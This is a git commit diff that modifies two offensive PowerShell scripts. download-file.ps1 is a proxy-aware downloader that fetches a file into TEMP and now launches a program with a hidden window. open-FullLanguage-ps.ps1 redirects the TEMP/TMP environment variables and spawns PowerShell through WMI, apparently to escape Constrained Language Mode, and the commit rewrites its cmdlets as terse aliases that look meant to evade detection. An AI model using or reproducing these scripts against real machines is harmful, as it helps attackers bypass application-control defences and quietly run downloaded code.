efe51344d30a308a2fa9f2105ee82edc669e73da
Gaspard VANDECASTEELE <gaspard.vandecasteele@student.yncrea.fr>
2023-01-15 21:08:01 +0100

    modification

--- download-file.ps1
+++ download-file.ps1
@@ -1,5 +1,7 @@
 $p=[System.Net.WebRequest]::GetSystemWebProxy()
 $p.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials
-$c=New-Object Net.WebClient;$c.Proxy=$p
+$c=New-Object Net.WebClient
+$c.Proxy=$p
 $c.DownloadFile("https://www.google.com",(Join-Path -Path $env:TEMP -ChildPath tmp.txt))
+saps -FilePath $prog -WindowStyle Hidden
 exit
--- open-FullLanguage-ps.ps1
+++ open-FullLanguage-ps.ps1
@@ -1,10 +1,21 @@
+# $a=$env:temp
+# $b=$env:tmp
+# $t="C:\windows\temp"
+# $s="C:\windows\temp"
+# Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value "$t"
+# Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value "$s"
+# Invoke-WmiMethod -Class win32_process -Name create -ArgumentList "powershell"
+# Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value $b
+# Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value $a
+# exit
+
 $a=$env:temp
 $b=$env:tmp
 $t="C:\windows\temp"
 $s="C:\windows\temp"
-Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value "$t"
-Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value "$s"
-Invoke-WmiMethod -Class win32_process -Name create -ArgumentList "powershell"
-Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value $b
-Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value $a
+sp -Path 'hkcu:\Environment' -Name Tmp -Value "$t"
+sp -Path 'hkcu:\Environment' -Name Temp -Value "$s"
+iwmi -Class win32_process -Name create -ArgumentList "powershell"
+sp -Path 'hkcu:\Environment' -Name Tmp -Value $b
+sp -Path 'hkcu:\Environment' -Name Temp -Value $a
 exit
